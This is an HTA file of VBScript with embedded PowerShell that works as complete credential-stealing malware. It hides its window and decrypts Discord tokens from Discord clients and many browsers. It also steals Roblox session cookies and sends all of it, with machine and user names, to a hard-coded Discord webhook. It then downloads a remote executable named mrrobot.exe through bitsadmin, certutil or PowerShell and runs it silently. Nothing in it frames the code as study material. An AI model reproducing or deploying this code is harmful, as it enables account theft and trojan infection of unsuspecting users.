<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0 : window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

WH   = "https://discordapp.com/api/webhooks/1551972586252927049/catFwspybQjsFn-37A5y4qAgptvv8lYoC-3P2-gz3u0e01pEB0Sq6e6ywotOW9tR0XoQ"
PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Call GrabDiscord()
Call GrabRoblox()
Call DropRAT()

window.close()

' ============================================================
' DISCORD TOKEN GRABBER — PowerShell engine
' ============================================================

Sub GrabDiscord()
    Dim psScript
    psScript = _
        "Add-Type -AssemblyName System.Security" & vbLf & _
        "Add-Type -AssemblyName System.Web" & vbLf & _
        "try { Add-Type -AssemblyName PresentationFramework } catch {}" & vbLf & _
        "" & vbLf & _
        "$WH = '" & WH & "'" & vbLf & _
        "$PC = $env:COMPUTERNAME" & vbLf & _
        "$USER = $env:USERNAME" & vbLf & _
        "" & vbLf & _
        "function Get-AESKey($path) {" & vbLf & _
        "    try {" & vbLf & _
        "        $ls = Join-Path $path 'Local State'" & vbLf & _
        "        if (-not (Test-Path $ls)) { return $null }" & vbLf & _
        "        $json = Get-Content $ls -Raw | ConvertFrom-Json" & vbLf & _
        "        $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)" & vbLf & _
        "        $encKey = $encKey[5..($encKey.Length-1)]" & vbLf & _
        "        return [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')" & vbLf & _
        "    } catch { return $null }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "function Decrypt-Token($enc, $key) {" & vbLf & _
        "    try {" & vbLf & _
        "        if ($enc.Length -lt 15) { return $null }" & vbLf & _
        "        $prefix = [System.Text.Encoding]::ASCII.GetString($enc[0..2])" & vbLf & _
        "        if ($prefix -eq 'v10' -or $prefix -eq 'v11') {" & vbLf & _
        "            $iv  = $enc[3..14]" & vbLf & _
        "            $data = $enc[15..($enc.Length-17)]" & vbLf & _
        "            $tag  = $enc[($enc.Length-16)..($enc.Length-1)]" & vbLf & _
        "            Add-Type -TypeDefinition @'" & vbLf & _
        "using System; using System.Security.Cryptography;" & vbLf & _
        "public class AesGcm2 {" & vbLf & _
        "    public static byte[] Decrypt(byte[] key,byte[] nonce,byte[] cipher,byte[] tag){" & vbLf & _
        "        using(var aes=new System.Security.Cryptography.AesGcm(key)){" & vbLf & _
        "            var plain=new byte[cipher.Length];" & vbLf & _
        "            aes.Decrypt(nonce,cipher,tag,plain);" & vbLf & _
        "            return plain;}}" & vbLf & _
        "}" & vbLf & _
        "'@ -ErrorAction SilentlyContinue" & vbLf & _
        "            try {" & vbLf & _
        "                $plain = [AesGcm2]::Decrypt($key,$iv,$data,$tag)" & vbLf & _
        "                return [System.Text.Encoding]::UTF8.GetString($plain)" & vbLf & _
        "            } catch { return $null }" & vbLf & _
        "        }" & vbLf & _
        "        return $null" & vbLf & _
        "    } catch { return $null }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "function Get-Tokens-From-LevelDB($ldbPath, $aesKey) {" & vbLf & _
        "    $found = @()" & vbLf & _
        "    $pattern = '(dQw4w9WgXcQ:[^.*\[""()*\]'']{10,}|mfa\.[a-zA-Z0-9_-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27,28})'" & vbLf & _
        "    if (-not (Test-Path $ldbPath)) { return $found }" & vbLf & _
        "    Get-ChildItem $ldbPath -Include *.ldb,*.log -Recurse -ErrorAction SilentlyContinue | ForEach-Object {" & vbLf & _
        "        try {" & vbLf & _
        "            $bytes = [System.IO.File]::ReadAllBytes($_.FullName)" & vbLf & _
        "            $text  = [System.Text.Encoding]::UTF8.GetString($bytes)" & vbLf & _
        "            $matches = [regex]::Matches($text, $pattern)" & vbLf & _
        "            foreach ($m in $matches) {" & vbLf & _
        "                $val = $m.Value" & vbLf & _
        "                if ($val.StartsWith('dQw4w9WgXcQ:')) {" & vbLf & _
        "                    if ($aesKey) {" & vbLf & _
        "                        $encB64  = $val.Split(':')[1]" & vbLf & _
        "                        $encBytes = [Convert]::FromBase64String($encB64)" & vbLf & _
        "                        $dec = Decrypt-Token $encBytes $aesKey" & vbLf & _
        "                        if ($dec) { $found += $dec }" & vbLf & _
        "                    }" & vbLf & _
        "                } else {" & vbLf & _
        "                    $found += $val" & vbLf & _
        "                }" & vbLf & _
        "            }" & vbLf & _
        "        } catch {}" & vbLf & _
        "    }" & vbLf & _
        "    return $found" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "function Validate-Token($token) {" & vbLf & _
        "    try {" & vbLf & _
        "        $req = [System.Net.WebRequest]::Create('https://discord.com/api/v9/users/@me')" & vbLf & _
        "        $req.Method = 'GET'" & vbLf & _
        "        $req.Headers.Add('Authorization', $token)" & vbLf & _
        "        $req.UserAgent = 'Mozilla/5.0'" & vbLf & _
        "        $req.Timeout = 8000" & vbLf & _
        "        $resp = $req.GetResponse()" & vbLf & _
        "        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())" & vbLf & _
        "        $json = $reader.ReadToEnd() | ConvertFrom-Json" & vbLf & _
        "        $nitro = @('None','Nitro Classic','Nitro','Nitro Basic')[$json.premium_type]" & vbLf & _
        "        return [PSCustomObject]@{" & vbLf & _
        "            Token    = $token" & vbLf & _
        "            Username = $json.username + '#' + $json.discriminator" & vbLf & _
        "            ID       = $json.id" & vbLf & _
        "            Email    = $json.email" & vbLf & _
        "            Phone    = $json.phone" & vbLf & _
        "            MFA      = $json.mfa_enabled" & vbLf & _
        "            Nitro    = $nitro" & vbLf & _
        "            Valid    = $true" & vbLf & _
        "        }" & vbLf & _
        "    } catch { return $null }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "function Send-Webhook($url, $body) {" & vbLf & _
        "    try {" & vbLf & _
        "        $req = [System.Net.WebRequest]::Create($url)" & vbLf & _
        "        $req.Method = 'POST'" & vbLf & _
        "        $req.ContentType = 'application/json'" & vbLf & _
        "        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)" & vbLf & _
        "        $req.ContentLength = $bytes.Length" & vbLf & _
        "        $s = $req.GetRequestStream()" & vbLf & _
        "        $s.Write($bytes, 0, $bytes.Length)" & vbLf & _
        "        $s.Close()" & vbLf & _
        "        $req.GetResponse() | Out-Null" & vbLf & _
        "    } catch {}" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "$LOCAL   = $env:LOCALAPPDATA" & vbLf & _
        "$ROAMING = $env:APPDATA" & vbLf & _
        "" & vbLf & _
        "$targets = @{" & vbLf & _
        "    'Discord'        = ""$ROAMING\Discord""" & vbLf & _
        "    'Discord Canary' = ""$ROAMING\discordcanary""" & vbLf & _
        "    'Discord PTB'    = ""$ROAMING\discordptb""" & vbLf & _
        "    'Lightcord'      = ""$ROAMING\Lightcord""" & vbLf & _
        "    'Chrome'         = ""$LOCAL\Google\Chrome\User Data""" & vbLf & _
        "    'Chrome SxS'     = ""$LOCAL\Google\Chrome SxS\User Data""" & vbLf & _
        "    'Edge'           = ""$LOCAL\Microsoft\Edge\User Data""" & vbLf & _
        "    'Brave'          = ""$LOCAL\BraveSoftware\Brave-Browser\User Data""" & vbLf & _
        "    'Opera'          = ""$ROAMING\Opera Software\Opera Stable""" & vbLf & _
        "    'Opera GX'       = ""$ROAMING\Opera Software\Opera GX Stable""" & vbLf & _
        "    'Vivaldi'        = ""$LOCAL\Vivaldi\User Data""" & vbLf & _
        "    'Yandex'         = ""$LOCAL\Yandex\YandexBrowser\User Data""" & vbLf & _
        "    'Torch'          = ""$LOCAL\Torch\User Data""" & vbLf & _
        "    'Amigo'          = ""$LOCAL\Amigo\User Data""" & vbLf & _
        "    'Kometa'         = ""$LOCAL\Kometa\User Data""" & vbLf & _
        "    'Orbitum'        = ""$LOCAL\Orbitum\User Data""" & vbLf & _
        "    'CentBrowser'    = ""$LOCAL\CentBrowser\User Data""" & vbLf & _
        "    '7Star'          = ""$LOCAL\7Star\7Star\User Data""" & vbLf & _
        "    'Sputnik'        = ""$LOCAL\Sputnik\Sputnik\User Data""" & vbLf & _
        "    'Epic'           = ""$LOCAL\Epic Privacy Browser\User Data""" & vbLf & _
        "    'Uran'           = ""$LOCAL\uCozMedia\Uran\User Data""" & vbLf & _
        "    'Iridium'        = ""$LOCAL\Iridium\User Data""" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "$allTokens = [System.Collections.Generic.HashSet[string]]::new()" & vbLf & _
        "" & vbLf & _
        "foreach ($name in $targets.Keys) {" & vbLf & _
        "    $base = $targets[$name]" & vbLf & _
        "    if (-not (Test-Path $base)) { continue }" & vbLf & _
        "    $aesKey = Get-AESKey $base" & vbLf & _
        "    $ldbPath = Join-Path $base 'Default\Local Storage\leveldb'" & vbLf & _
        "    $tokens = Get-Tokens-From-LevelDB $ldbPath $aesKey" & vbLf & _
        "    foreach ($t in $tokens) { $allTokens.Add($t) | Out-Null }" & vbLf & _
        "    # also scan Discord client local storage directly" & vbLf & _
        "    $discordLS = Join-Path $base 'Local Storage\leveldb'" & vbLf & _
        "    $tokens2 = Get-Tokens-From-LevelDB $discordLS $aesKey" & vbLf & _
        "    foreach ($t in $tokens2) { $allTokens.Add($t) | Out-Null }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "if ($allTokens.Count -eq 0) {" & vbLf & _
        "    $body = '{""embeds"":[{""title"":""Discord Token"",""description"":""No tokens found"",""color"":16711680,""footer"":{""text"":""' + $PC + ' / ' + $USER + '""}}]}'" & vbLf & _
        "    Send-Webhook $WH $body" & vbLf & _
        "    exit" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "$results = @()" & vbLf & _
        "foreach ($tok in $allTokens) {" & vbLf & _
        "    $info = Validate-Token $tok" & vbLf & _
        "    if ($info) { $results += $info }" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "if ($results.Count -eq 0) {" & vbLf & _
        "    $raw = ($allTokens | ForEach-Object { $_ }) -join ""`n""" & vbLf & _
        "    $body = '{""embeds"":[{""title"":""Discord Token"",""description"":""Found ' + $allTokens.Count + ' candidate(s) unvalidated\n\n' + ($raw -replace '""','') + '"",""color"":16776960,""footer"":{""text"":""' + $PC + ' / ' + $USER + '""}}]}'" & vbLf & _
        "    Send-Webhook $WH $body" & vbLf & _
        "    exit" & vbLf & _
        "}" & vbLf & _
        "" & vbLf & _
        "foreach ($r in $results) {" & vbLf & _
        "    $desc  = ""**Token:** \`\`\`$($r.Token)\`\`\`\n"" +" & vbLf & _
        "             ""**User:** $($r.Username)\n"" +" & vbLf & _
        "             ""**ID:** $($r.ID)\n"" +" & vbLf & _
        "             ""**Email:** $($r.Email)\n"" +" & vbLf & _
        "             ""**Phone:** $($r.Phone)\n"" +" & vbLf & _
        "             ""**MFA:** $($r.MFA)\n"" +" & vbLf & _
        "             ""**Nitro:** $($r.Nitro)""" & vbLf & _
        "    $desc  = $desc -replace '""','\\""'" & vbLf & _
        "    $body  = '{""embeds"":[{""title"":""✅ Discord Token Valid"",""description"":""' + $desc + '"",""color"":65280,""footer"":{""text"":""' + $PC + ' / ' + $USER + '""}}]}'" & vbLf & _
        "    Send-Webhook $WH $body" & vbLf & _
        "}"

    ' write ps1 to temp and execute silently
    Dim psPath: psPath = TmpFile("dztk.ps1")
    WriteFile psPath, psScript
    RunCmd "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """"
    fso.DeleteFile psPath, True
End Sub

' ============================================================
' ROBLOX COOKIE GRABBER
' ============================================================

Sub GrabRoblox()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%")      & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%")  & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"

    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next

    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(subf.Name, "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp : Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If

    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680) : Exit Sub

    raw = ReadFile(fp)
    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680) : Exit Sub

    Dim cookie: cookie = "" : Dim approach: approach = ""

    If InStr(raw, "_|WARNING") > 0 Then cookie = raw : approach = "Plaintext"

    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
        approach = "JSON-DPAPI"
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then
                    cookie = DecryptDPAPI(b64)
                    If Len(cookie) = 0 Then cookie = b64 : approach = "JSON-Raw"
                End If
            End If
        End If
    End If

    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        approach = "Raw-ROBLOSECURITY"
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
        cookie = Mid(raw, rp)
    End If

    If Len(cookie) = 0 Then cookie = raw : approach = "RawFile"

    Dim cae: cae = InStr(cookie, "|$CAE")
    If cae = 0 Then cae = InStr(cookie, "|_CAE")
    If cae > 0 Then cookie = Mid(cookie, cae)

    Call PostEmbed("Roblox (" & approach & ")", "Size: " & Len(cookie) & vbLf & Left(cookie, 60) & "...", 65280)
    Call PostFile("cookie.txt", cookie)
End Sub

' ============================================================
' RAT DROPPER
' ============================================================

Sub DropRAT()
    Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\mrrobot.exe"
    Dim dl:   dl   = "https://github.com/sasukeuchicaj-debug/fictional-guide/raw/refs/heads/main/mrrobot.exe"

    sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True

    If Not fso.FileExists(temp) Then
        sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
    End If

    If Not fso.FileExists(temp) Then
        sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
    End If

    If fso.FileExists(temp) Then sh.Run Chr(34) & temp & Chr(34), 0, False
End Sub

' ============================================================
' DPAPI
' ============================================================

Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    On Error Resume Next
    Dim inf:  inf  = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
    If fso.FileExists(outf) Then
        If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    End If
    fso.DeleteFile inf,  True
    fso.DeleteFile psf,  True
    fso.DeleteFile outf, True
End Function

' ============================================================
' HELPERS
' ============================================================

Sub RunCmd(cmd)
    On Error Resume Next
    Dim w, p, i, s
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
    s.ShowWindow = 0
    Set p = w.Get("Win32_Process")
    p.Create cmd,,s,i
    If i = 0 Then Exit Sub
    Dim r: r = True
    Do While r
        Set w = GetObject("winmgmts:\\.\root\cimv2")
        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
        Set w = Nothing
        If r Then WScript.Sleep 150
    Loop
End Sub

Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function

Sub WriteFile(path, content)
    On Error Resume Next
    Dim f: Set f = fso.CreateTextFile(path, True)
    f.Write content
    f.Close
    Set f = Nothing
End Sub

Function ReadFile(path)
    ReadFile = ""
    On Error Resume Next
    Dim f: Set f = fso.OpenTextFile(path, 1)
    ReadFile = f.ReadAll
    f.Close
    Set f = Nothing
End Function

Sub PostEmbed(t, d, c)
    On Error Resume Next
    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Sub PostFile(fn, ct)
    On Error Resume Next
    Dim b:  b  = MkGuid()
    Dim bd: bd = "--" & b & vbCrLf & _
                 "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & _
                 ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

Function Ej(s)
    s = Replace(s, "\",   "\\")
    s = Replace(s, """",  "\""")
    s = Replace(s, vbCrLf, "\n")
    s = Replace(s, vbCr,   "\n")
    s = Replace(s, vbLf,   "\n")
    s = Replace(s, vbTab,  "\t")
    Ej = s
End Function

Function MkGuid()
    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
    MkGuid = Mid(t.GUID, 2, 36)
    Set t = Nothing
End Function
</script>
</head><body></body></html>
